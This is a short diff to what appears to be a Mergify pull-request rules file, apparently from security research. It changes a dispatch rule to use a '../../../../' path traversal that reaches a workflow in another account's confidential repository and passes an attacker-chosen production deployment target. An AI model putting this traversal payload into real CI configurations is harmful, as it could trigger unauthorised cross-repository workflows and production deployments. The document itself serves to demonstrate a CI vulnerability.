@@ -1,11 +1,13 @@
 pull_request_rules:
-  - name: cross-account-dispatch
+  - name: attacker-controls-inputs
     conditions:
       - base=main
-      - label=pwn-acct
+      - label=pwn-inputs
     actions:
       github_actions:
         workflow:
           dispatch:
-            - workflow: "../../../../kirasec-lab-7c3e/probe-lab/actions/workflows/crossacct-probe.yml"
+            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/deploy-probe.yml"
               ref: main
+              inputs:
+                target: "ATTACKER-CHOSE-production-us-east-1"
